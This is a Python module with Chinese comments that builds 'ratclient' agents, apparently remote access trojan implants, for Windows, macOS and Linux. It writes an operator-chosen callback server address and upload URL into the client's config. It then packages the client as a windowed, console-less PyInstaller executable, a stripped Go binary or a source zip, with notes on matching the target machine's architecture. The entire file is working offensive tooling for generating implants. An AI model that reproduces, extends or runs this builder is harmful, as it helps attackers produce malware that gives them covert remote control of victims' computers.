import os
import platform
import shutil
import subprocess
import tempfile
import zipfile
from datetime import datetime

from core.utils.logger import logger


class AgentBuilder:
    """Agent 生成器"""

    # 需要排除的目录
    EXCLUDE_DIRS = {'venv', '__pycache__', '.git', 'node_modules', 'dist', 'build', '.idea', '.vscode', 'runtime'}
    EXCLUDE_EXTENSIONS = {'.pyc', '.pyo', '.pyd'}
    BUNDLE_INCLUDE_PATHS = ('client', 'core', 'ratclient.py')
    SUPPORTED_TARGETS = {'win', 'mac', 'linux'}
    SUPPORTED_BUILDERS = {'pyinstaller', 'go', 'bundle'}
    SUPPORTED_GO_ARCHES = {'auto', 'amd64', 'arm64'}
    PYINSTALLER_PLATFORM_MAP = {
        'Windows': 'win',
        'Darwin': 'mac',
        'Linux': 'linux',
    }
    GO_TARGET_MAP = {
        'win': {'GOOS': 'windows', 'suffix': '.exe', 'label': 'windows'},
        'mac': {'GOOS': 'darwin', 'suffix': '', 'label': 'mac'},
        'linux': {'GOOS': 'linux', 'suffix': '', 'label': 'linux'},
    }

    def __init__(self):
        self.source_dir = os.path.abspath('.')
        self.output_dir = os.path.abspath(os.path.join('runtime', 'agent_output'))
        self._ensure_dirs()

    def _ensure_dirs(self):
        os.makedirs(self.output_dir, exist_ok=True)

    def _build_timestamp_text(self) -> str:
        return datetime.now().strftime('%Y%m%d-%H%M')

    def _build_version_text(self, builder: str) -> str:
        builder_name = (builder or '').strip().lower()
        if builder_name == 'bundle':
            return f'dev-source-bundle-{self._build_timestamp_text()}'
        if builder_name == 'pyinstaller':
            return f'dev-pyinstaller-{self._build_timestamp_text()}'
        if builder_name == 'go':
            return f'dev-go-{self._build_timestamp_text()}'
        return f'dev-{builder_name or "build"}-{self._build_timestamp_text()}'

    def _build_pyinstaller_output_name(self, target_os: str, build_version: str) -> str:
        if target_os == 'win':
            return f'ratclient_{target_os}_{build_version}.exe'
        return f'ratclient_{target_os}_{build_version}'

    def _build_go_output_name(self, target_os: str, normalized_arch: str, build_version: str) -> str:
        suffix = self.GO_TARGET_MAP[target_os]['suffix']
        label = self.GO_TARGET_MAP[target_os]['label']
        return f'ratclient_go_{label}_{normalized_arch}_{build_version}{suffix}'

    def _build_bundle_output_name(self, build_version: str) -> str:
        return f'ratclient_bundle_{build_version}.zip'

    def build_agent(self, server_host: str, server_port: int,
                    web_port: int, target_os: str = 'mac',
                    builder: str = 'pyinstaller', target_arch: str = 'auto',
                    server_web_scheme: str = 'http', server_web_host: str = '') -> dict:
        """
        构建 Agent
        """
        builder = (builder or 'pyinstaller').strip().lower()
        target_arch = (target_arch or 'auto').strip().lower()
        target_os = (target_os or 'mac').strip().lower()
        server_web_scheme = (server_web_scheme or 'http').strip().lower() or 'http'
        server_web_host = (server_web_host or server_host).strip() or server_host

        if builder not in self.SUPPORTED_BUILDERS:
            raise ValueError(f'Unsupported builder: {builder}')

        if target_arch not in self.SUPPORTED_GO_ARCHES:
            raise ValueError(f'Unsupported target arch: {target_arch}')

        if builder != 'bundle' and target_os not in self.SUPPORTED_TARGETS:
            raise ValueError(f'Unsupported target OS: {target_os}')

        work_dir = tempfile.mkdtemp(prefix='agent_build_')
        build_version = self._build_version_text(builder)

        try:
            if builder == 'pyinstaller':
                result = self._build_with_pyinstaller(
                    work_dir=work_dir,
                    server_host=server_host,
                    server_port=server_port,
                    web_port=web_port,
                    target_os=target_os,
                    target_arch=target_arch,
                    build_version=build_version,
                    server_web_scheme=server_web_scheme,
                    server_web_host=server_web_host,
                )
            elif builder == 'bundle':
                result = self._build_with_bundle(
                    work_dir=work_dir,
                    server_host=server_host,
                    server_port=server_port,
                    web_port=web_port,
                    build_version=build_version,
                    server_web_scheme=server_web_scheme,
                    server_web_host=server_web_host,
                )
            else:
                result = self._build_with_go(
                    work_dir=work_dir,
                    server_host=server_host,
                    server_port=server_port,
                    web_port=web_port,
                    target_os=target_os,
                    target_arch=target_arch,
                    build_version=build_version,
                    server_web_scheme=server_web_scheme,
                    server_web_host=server_web_host,
                )

            # 复制产物到输出目录
            output_path = os.path.join(self.output_dir, result['file_name'])
            shutil.copy2(result['file_path'], output_path)

            warnings = result.get('warnings', [])
            if not isinstance(warnings, list):
                warnings = [str(warnings)]

            return {
                'file_path': output_path,
                'file_name': result['file_name'],
                'size': os.path.getsize(output_path),
                'work_dir': work_dir,
                'builder': builder,
                'target_os': result.get('target_os', target_os),
                'warnings': warnings,
                'target_arch': result.get('target_arch', target_arch),
                'build_version': build_version,
            }

        except Exception:
            shutil.rmtree(work_dir, ignore_errors=True)
            raise

    def _copy_source_with_excludes(self, src: str, dst: str):
        """复制源码，排除无用目录"""
        shutil.copytree(
            src, dst,
            ignore=shutil.ignore_patterns(
                *[f'*/{d}' for d in self.EXCLUDE_DIRS],
                *[f'*{ext}' for ext in self.EXCLUDE_EXTENSIONS]
            ),
            ignore_dangling_symlinks=True
        )

    def _inject_config(
        self,
        client_dir: str,
        server_host: str,
        server_port: int,
        web_port: int,
        build_version: str,
        server_web_scheme: str = 'http',
        server_web_host: str = '',
    ):
        """直接用模板替换 config.py"""
        config_path = os.path.join(client_dir, 'client', 'config', 'config.py')
        server_web_host = (server_web_host or server_host).strip() or server_host

        template = f'''import os

SERVER_HOST = "{server_host}"
SERVER_PORT = {server_port}
SERVER_ADDR = (SERVER_HOST, SERVER_PORT)

SERVER_WEB_SCHEME = "{server_web_scheme}"
SERVER_WEB_HOST = "{server_web_host}"
SERVER_WEB_PORT = {web_port}
UPLOAD_BASE_URL = f"{{SERVER_WEB_SCHEME}}://{{SERVER_WEB_HOST}}:{{SERVER_WEB_PORT}}"

CLIENT_BUILD_VERSION = "{build_version}"
'''

        with open(config_path, 'w', encoding='utf-8') as f:
            f.write(template)

    def _inject_go_config(
        self,
        client_dir: str,
        server_host: str,
        server_port: int,
        web_port: int,
        build_version: str,
        server_web_scheme: str = 'http',
        server_web_host: str = '',
    ):
        """直接用模板替换 client-go/config/config.go"""
        config_path = os.path.join(client_dir, 'client-go', 'config', 'config.go')
        server_web_host = (server_web_host or server_host).strip() or server_host

        template = f'''package config

var SERVER_ADDR = "{server_host}:{server_port}"
var SERVER_WEB_SCHEME = "{server_web_scheme}"
var SERVER_WEB_HOST = "{server_web_host}"
var SERVER_WEB_PORT = {web_port}
var UPLOAD_BASE_URL = SERVER_WEB_SCHEME + "://" + SERVER_WEB_HOST + ":" + "{web_port}"
var CLIENT_BUILD_VERSION = "{build_version}"
'''

        with open(config_path, 'w', encoding='utf-8') as f:
            f.write(template)

    def _build_with_pyinstaller(self, work_dir: str, server_host: str, server_port: int,
                                web_port: int, target_os: str, target_arch: str = 'auto',
                                build_version: str = 'dev', server_web_scheme: str = 'http',
                                server_web_host: str = '') -> dict:
        current_target = self._get_current_pyinstaller_target()
        if current_target != target_os:
            current_label = self._describe_target(current_target)
            target_label = self._describe_target(target_os)
            raise ValueError(
                'PyInstaller 仅支持与当前服务端相同平台的打包。'
                f' 当前服务端平台：{current_label}，你选择的是：{target_label}。'
            )

        # 复制客户端源码（排除无用目录）
        client_copy = os.path.join(work_dir, 'rat')
        self._copy_source_with_excludes(self.source_dir, client_copy)
        logger.info(f'临时文件：{os.path.abspath(client_copy)}')

        # 注入配置
        self._inject_config(
            client_copy,
            server_host,
            server_port,
            web_port,
            build_version=build_version,
            server_web_scheme=server_web_scheme,
            server_web_host=server_web_host,
        )

        # 根据目标系统构建
        if target_os == 'win':
            result = self._build_windows(client_copy, build_version=build_version)
        elif target_os == 'linux':
            result = self._build_linux(client_copy, build_version=build_version)
        else:
            result = self._build_macos(client_copy, build_version=build_version)

        result['warnings'] = [
            'PyInstaller 产物与当前服务端平台一致。'
        ]
        result['target_arch'] = target_arch
        result['target_os'] = target_os
        return result

    def _build_with_go(self, work_dir: str, server_host: str, server_port: int,
                       web_port: int, target_os: str, target_arch: str = 'auto',
                       build_version: str = 'dev', server_web_scheme: str = 'http',
                       server_web_host: str = '') -> dict:
        go_project_dir = os.path.join(self.source_dir, 'client-go')
        if not os.path.isdir(go_project_dir):
            raise FileNotFoundError('client-go directory not found')

        client_copy = os.path.join(work_dir, 'rat')
        self._copy_source_with_excludes(self.source_dir, client_copy)
        logger.info(f'临时文件：{os.path.abspath(client_copy)}')

        self._inject_go_config(
            client_copy,
            server_host,
            server_port,
            web_port,
            build_version=build_version,
            server_web_scheme=server_web_scheme,
            server_web_host=server_web_host,
        )

        go_target = self.GO_TARGET_MAP[target_os]
        normalized_arch = self._resolve_goarch_for_target(target_os, target_arch)
        output_name = self._build_go_output_name(target_os, normalized_arch, build_version)
        output_path = os.path.join(client_copy, 'client-go', output_name)

        env = os.environ.copy()
        env.update({
            'CGO_ENABLED': '0',
            'GOOS': go_target['GOOS'],
            'GOARCH': normalized_arch,
        })

        cmd = [
            'go', 'build',
            '-trimpath',
            '-ldflags', '-s -w',
            '-o', output_path,
            '.',
        ]

        result = subprocess.run(
            cmd,
            cwd=os.path.join(client_copy, 'client-go'),
            capture_output=True,
            text=True,
            env=env
        )

        if result.returncode != 0:
            raise RuntimeError(f'Go build failed: {result.stderr or result.stdout}')

        if not os.path.exists(output_path):
            raise RuntimeError(f'Build output not found: {output_path}')

        if target_os != 'win':
            os.chmod(output_path, 0o755)

        warnings = [
            f'Go 已按目标平台 {self._describe_target(target_os)} 构建，目标架构为 {normalized_arch}。'
        ]
        if target_os == 'win':
            warnings.append('Windows 默认优先打包为 amd64；如果目标机器是 Windows on ARM，请在前台将架构切换为 arm64。')
        elif target_os == 'linux':
            warnings.append('Linux 默认优先打包为 amd64；如果目标机器是 ARM 设备，请在前台将架构切换为 arm64。')
        elif target_os == 'mac':
            warnings.append(
                'macOS 默认会优先选择当前服务端更匹配的架构；如果目标机器架构不同，请在前台手动改为 amd64 或 arm64。')

        return {
            'file_path': output_path,
            'file_name': output_name,
            'warnings': warnings,
            'target_arch': normalized_arch,
            'target_os': target_os,
        }

    def _build_with_bundle(self, work_dir: str, server_host: str, server_port: int,
                           web_port: int, build_version: str,
                           server_web_scheme: str = 'http', server_web_host: str = '') -> dict:
        staging_dir = os.path.join(work_dir, 'bundle')
        os.makedirs(staging_dir, exist_ok=True)

        # bundle 仅包含 client / core / ratclient.py
        for relative_path in self.BUNDLE_INCLUDE_PATHS:
            source_path = os.path.join(self.source_dir, relative_path)
            if not os.path.exists(source_path):
                raise FileNotFoundError(f'Bundle source not found: {relative_path}')

            target_path = os.path.join(staging_dir, relative_path)
            if os.path.isdir(source_path):
                shutil.copytree(
                    source_path,
                    target_path,
                    ignore=shutil.ignore_patterns(
                        *self.EXCLUDE_DIRS,
                        *[f'*{ext}' for ext in self.EXCLUDE_EXTENSIONS],
                    ),
                    ignore_dangling_symlinks=True,
                )
            else:
                os.makedirs(os.path.dirname(target_path), exist_ok=True)
                shutil.copy2(source_path, target_path)

        self._inject_config(
            staging_dir,
            server_host,
            server_port,
            web_port,
            build_version=build_version,
            server_web_scheme=server_web_scheme,
            server_web_host=server_web_host,
        )

        bundle_name = self._build_bundle_output_name(build_version)
        bundle_path = os.path.join(work_dir, bundle_name)

        with zipfile.ZipFile(bundle_path, mode='w', compression=zipfile.ZIP_DEFLATED) as archive:
            for relative_path in self.BUNDLE_INCLUDE_PATHS:
                source_path = os.path.join(staging_dir, relative_path)
                if os.path.isdir(source_path):
                    for root, _, files in os.walk(source_path):
                        for filename in files:
                            file_path = os.path.join(root, filename)
                            arcname = os.path.relpath(file_path, staging_dir)
                            archive.write(file_path, arcname=arcname)
                else:
                    archive.write(source_path, arcname=relative_path)

        return {
            'file_path': bundle_path,
            'file_name': bundle_name,
            'warnings': ['Bundle 模式会输出源码 zip，不适用目标系统和架构选择。'],
            'target_arch': 'n/a',
            'target_os': 'bundle',
        }

    def _build_macos(self, client_dir: str, build_version: str = 'dev') -> dict:
        """macOS 构建"""
        cmd = [
            'pyinstaller', '-F', '-w', 'ratclient.py',
            '--hidden-import', 'client.commands.platform.mac',
            '--hidden-import', 'client.commands.platform.win',
            '--hidden-import', 'client.commands.platform.linux',
        ]

        result = subprocess.run(
            cmd,
            cwd=client_dir,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        os.chmod(exe_path, 0o755)

        return {
            'file_path': exe_path,
            'file_name': self._build_pyinstaller_output_name('mac', build_version),
        }

    def _build_windows(self, client_dir: str, build_version: str = 'dev') -> dict:
        """Windows 构建"""
        cmd = [
            'pyinstaller', '-F', '-w', 'ratclient.py',
            '--hidden-import', 'client.commands.platform.mac',
            '--hidden-import', 'client.commands.platform.win',
            '--hidden-import', 'client.commands.platform.linux',
        ]

        result = subprocess.run(
            cmd,
            cwd=client_dir,
            capture_output=True,
            text=True,
            shell=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient.exe')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        return {
            'file_path': exe_path,
            'file_name': self._build_pyinstaller_output_name('win', build_version),
        }

    def _build_linux(self, client_dir: str, build_version: str = 'dev') -> dict:
        """Linux 构建"""
        cmd = [
            'pyinstaller', '-F', '-w', 'ratclient.py',
            '--hidden-import', 'client.commands.platform.mac',
            '--hidden-import', 'client.commands.platform.win',
            '--hidden-import', 'client.commands.platform.linux',
        ]

        result = subprocess.run(
            cmd,
            cwd=client_dir,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        os.chmod(exe_path, 0o755)

        return {
            'file_path': exe_path,
            'file_name': self._build_pyinstaller_output_name('linux', build_version),
        }

    def _get_current_pyinstaller_target(self) -> str:
        current_system = platform.system()
        current_target = self.PYINSTALLER_PLATFORM_MAP.get(current_system)
        if not current_target:
            raise ValueError(f'当前服务端平台暂不支持 PyInstaller: {current_system}')
        return current_target

    def _normalize_goarch(self, arch: str) -> str:
        value = (arch or '').strip().lower()
        aliases = {
            'x86_64': 'amd64',
            'amd64': 'amd64',
            'arm64': 'arm64',
            'aarch64': 'arm64',
            'x64': 'amd64',
        }
        return aliases.get(value, value or 'amd64')

    def _resolve_goarch_for_target(self, target_os: str, target_arch: str = 'auto') -> str:
        """
        根据目标平台和前台选择推导最终 GOARCH

        规则：
        - 前台明确选择 amd64 / arm64 时，直接使用该值
        - auto 模式下：
          - Windows 默认优先 amd64
          - Linux 默认优先 amd64
          - macOS 默认优先当前服务端更匹配的架构
        """
        normalized_target_arch = self._normalize_goarch(target_arch)
        if normalized_target_arch in {'amd64', 'arm64'} and target_arch != 'auto':
            return normalized_target_arch

        current_goarch = os.environ.get('GOARCH', '').strip() or platform.machine().lower()
        normalized_current_arch = self._normalize_goarch(current_goarch)

        if target_os == 'win':
            return 'amd64'

        if target_os == 'linux':
            return 'amd64'

        if target_os == 'mac':
            if normalized_current_arch in {'amd64', 'arm64'}:
                return normalized_current_arch
            return 'arm64'

        return 'amd64'

    def _describe_target(self, target_os: str) -> str:
        mapping = {
            'win': 'Windows',
            'mac': 'macOS',
            'linux': 'Linux',
            'bundle': 'Bundle',
        }
        return mapping.get(target_os, target_os)

    def cleanup(self, work_dir: str):
        """清理临时目录"""
        if work_dir and os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)